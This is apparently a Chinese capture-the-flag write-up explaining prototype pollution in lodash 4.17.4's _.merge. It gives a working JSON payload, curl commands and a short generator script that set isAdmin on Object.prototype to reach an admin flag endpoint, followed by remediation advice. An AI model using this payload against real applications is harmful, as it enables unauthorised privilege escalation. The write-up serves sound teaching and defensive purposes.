# A08 Easy - WriteUP

## 漏洞原理

### 原型污染 (Prototype Pollution)

在 JavaScript 中，所有对象都继承自 `Object.prototype`。当我们通过原型链上的特殊属性名（如 `__proto__`、`constructor.prototype`）向对象添加属性时，这些属性会被添加到 `Object.prototype` 上，从而影响所有对象。

lodash@4.17.4 的 `_.merge()` 函数在处理带有 `__proto__` 键的对象时，会递归地将值合并到目标对象的原型中，导致原型污染。

### 漏洞点

题目中的代码：
```javascript
const merged = _.merge({}, defaultConfig, userConfig);
```

如果 `userConfig` 为 `{"__proto__": {"isAdmin": true}}`，`_.merge` 会将 `isAdmin: true` 合并到 `{}` 的原型（即 `Object.prototype`）上。此后所有普通对象（包括 `req.user = {}`）通过属性访问 `obj.isAdmin` 时，都会沿着原型链找到 `Object.prototype.isAdmin`，返回 `true`。

## 利用步骤

### 第一步：访问题目首页

打开浏览器或 curl 访问目标地址，了解接口信息。

### 第二步：发送原型污染 payload

```bash
curl -X POST http://target/api/update \
  -H "Content-Type: application/json" \
  -d '{"__proto__":{"isAdmin":true}}'
```

### 第三步：访问管理员接口获取 flag

```bash
curl http://target/admin/flag
```

返回结果：
```json
{"success":true,"flag":"flag{...}"}
```

## 生成 Payload 的脚本

```javascript
// payload_generator.js
const payload = JSON.stringify({
    "__proto__": {
        "isAdmin": true
    }
});

console.log("Payload:");
console.log(payload);
console.log("\nCurl command:");
console.log(`curl -X POST http://target/api/update -H "Content-Type: application/json" -d '${payload}'`);
```

## 修复建议

1. **升级 lodash**: 升级到 lodash@4.17.12 或更高版本，该版本修复了原型污染漏洞。

2. **使用安全的合并函数**: 使用 `Object.assign()` 或自定义安全的深度合并函数，禁止合并 `__proto__`、`constructor`、`prototype` 等危险键。

3. **输入校验**: 在合并用户输入前，递归检查并过滤掉危险的键名。

4. **避免依赖原型链做权限判断**: 权限检查应使用 `Object.prototype.hasOwnProperty.call(req.user, 'isAdmin')` 或 `Object.hasOwn(req.user, 'isAdmin')` 来确保属性是对象自身的属性，而非原型链上的属性。

```javascript
// 安全示例
if (Object.prototype.hasOwnProperty.call(req.user, 'isAdmin') && req.user.isAdmin) {
    // 授予权限
}
```

5. **使用 Object.create(null)**: 创建不继承自 Object.prototype 的对象，从根本上避免原型污染影响。

```javascript
const safeObj = Object.create(null);
```
